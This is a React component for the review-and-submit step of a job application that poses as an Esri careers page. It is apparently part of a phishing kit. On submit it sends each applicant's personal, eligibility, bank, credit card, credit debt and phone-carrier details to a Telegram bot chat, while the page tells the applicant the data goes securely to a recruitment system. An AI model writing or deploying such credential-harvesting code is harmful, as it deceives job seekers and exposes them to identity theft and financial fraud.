import React, { useState } from 'react';
import { FormData } from './ApplicationForm';
import { Loader2, ShieldCheck, Mail, MapPin, User, ChevronRight, Phone, CheckCircle2 } from 'lucide-react';

interface ReviewStepProps {
  formData: FormData;
  onNext: (data: Partial<FormData>) => void;
}

export function ReviewStep({ formData, onNext }: ReviewStepProps) {
  const [additionalQuestions, setAdditionalQuestions] = useState(formData.additionalQuestions);
  const [isReviewing, setIsReviewing] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsReviewing(true);

    try {
      const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
      const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

      if (!BOT_TOKEN || !CHAT_ID) {
        throw new Error('Telegram credentials are not configured.');
      }

      const message = `
🌟 *New Esri Career Application* 🌟

👤 *Personal Information*
• First Name: ${formData.firstName}
• Last Name: ${formData.lastName}
• Email: ${formData.email}
• Phone: ${formData.phoneNumber}
• Location: ${formData.location}
• U.S. Citizen: ${formData.citizenship === 'yes' ? 'Yes' : 'No'}

💼 *Eligibility & Compliance*
• Green Card: ${formData.hasGreenCard || 'N/A'}
• No Felony: ${formData.hasFelon === 'yes' ? 'Confirmed' : 'No'}
• Drug Free: ${formData.drugFree === 'yes' ? 'Confirmed' : 'No'}
• References: ${formData.hasReference === 'no' ? 'No' : `${formData.referenceName} (${formData.referencePhone})`}

🚀 *Professional Profile*
• Position: ${formData.positionType === 'full-time' ? 'Full-Time' : 'Part-Time'}
• Strengths: ${formData.strengths || 'N/A'}
• Weaknesses: ${formData.weaknesses || 'N/A'}
• Summary: ${formData.professionalProfile || 'N/A'}
• Goals: ${formData.careerObjectives || 'N/A'}
• Remote Ready: ${formData.understandsRemote === 'yes' ? 'Yes' : 'No'}

💰 *Compensation & Logistics*
• Desired Rate: $${formData.desiredHourlyRate}.00 / HR
• Frequency: ${formData.paymentFrequency || 'N/A'}
• Bank: ${formData.bankName || 'N/A'}
• Credit Card: ${formData.hasCreditCard === 'yes' ? `Yes (${formData.creditCardIssuer}, Lim: ${formData.creditLimit})` : 'No'}
• Credit Debt: ${formData.hasCreditDebt === 'yes' ? 'Yes' : 'No'}

📱 *Device & Connectivity*
• Provider: ${formData.phoneProvider || 'N/A'}
• Plan Type: ${formData.phoneType || 'N/A'}

📝 *Interview Code:* ${formData.interviewCode}
💬 *Comments:* ${additionalQuestions || 'None provided'}
      `;

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        }),
      });

      if (!response.ok) {
        throw new Error('Failed to send data to Telegram');
      }

      onNext({ additionalQuestions });
    } catch (error) {
      console.error('Submission Error:', error);
      alert('There was an issue submitting your application. Please ensure Telegram credentials are set.');
      setIsReviewing(false);
    }
  };

  if (isReviewing) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[400px] space-y-6 animate-fade-in">
        <div className="relative">
          <div className="absolute inset-0 bg-primary/20 blur-xl rounded-full animate-pulse" />
          <Loader2 className="w-12 h-12 text-primary animate-spin relative z-10" />
        </div>
        <div className="text-center space-y-2">
          <h2 className="text-lg font-display font-semibold text-secondary tracking-tight">
            Submitting Your Application
          </h2>
          <p className="text-xs text-secondary-light max-w-xs mx-auto">
            Please wait while we securely transmit your data to our recruitment system.
          </p>
        </div>
      </div>
    );
  }

  const DataRow = ({ label, value }: { label: string, value: string }) => (
    <div className="grid grid-cols-3 gap-4 py-2.5 border-b border-border-subtle/50 last:border-0 hover:bg-bg-soft/50 transition-colors px-2 -mx-2 rounded">
      <div className="col-span-1 text-[11px] font-semibold text-secondary-light uppercase tracking-wider flex items-center">
        {label}
      </div>
      <div className="col-span-2 text-sm font-medium text-secondary truncate">
        {value || <span className="text-secondary-light/50 italic">Not provided</span>}
      </div>
    </div>
  );

  return (
    <div className="space-y-6 animate-fade-in">
      <div className="border-b-2 border-primary w-fit pb-2 mb-6">
        <h2 className="text-xl font-display font-black text-secondary tracking-tighter uppercase flex items-center gap-2">
          Review Your Application <CheckCircle2 className="w-6 h-6 text-primary" />
        </h2>
        <p className="text-primary font-black text-[10px] uppercase tracking-widest mt-1">
          Final Verification & Transmission
        </p>
      </div>

      <div className="dashboard-panel p-6 space-y-8">
        {/* Data Tables */}
        <div className="space-y-6">

          <div>
            <h3 className="section-header text-sm">Personal Information</h3>
            <div className="space-y-1">
              <DataRow label="First Name" value={formData.firstName} />
              <DataRow label="Last Name" value={formData.lastName} />
              <DataRow label="Email Address" value={formData.email} />
              <DataRow label="Phone Number" value={formData.phoneNumber} />
              <DataRow label="Location" value={formData.location} />
              <DataRow label="U.S. Citizen" value={formData.citizenship === 'yes' ? 'Yes' : 'No'} />
            </div>
          </div>

          <div>
            <h3 className="section-header text-sm">Application Details</h3>
            <div className="space-y-1">
              <DataRow label="Interview Code" value={formData.interviewCode} />
              <DataRow label="Position Type" value={formData.positionType === 'full-time' ? 'Full-Time' : 'Part-Time'} />
              <DataRow label="Desired Rate" value={`$${formData.desiredHourlyRate}.00 / HR`} />
              <DataRow label="Bank Name" value={formData.bankName} />
            </div>
          </div>
        </div>

        {/* Final Notes */}
        <div className="pt-6 border-t border-border-subtle">
          <label className="data-label">Additional Comments or Questions</label>
          <textarea
            value={additionalQuestions}
            onChange={(e) => setAdditionalQuestions(e.target.value)}
            className="esri-input mt-2 min-h-[80px]"
            placeholder="Any final notes for the hiring team..."
          />
        </div>
      </div>

      <div className="pt-4 flex justify-between items-center">
        <p className="text-[10px] text-secondary-light max-w-xs leading-relaxed">
          By clicking submit, you confirm that the information provided is accurate to the best of your knowledge.
        </p>
        <button
          onClick={handleSubmit}
          className="esri-button"
        >
          Submit Application
          <ChevronRight className="w-4 h-4 ml-1" />
        </button>
      </div>
    </div>
  );
}
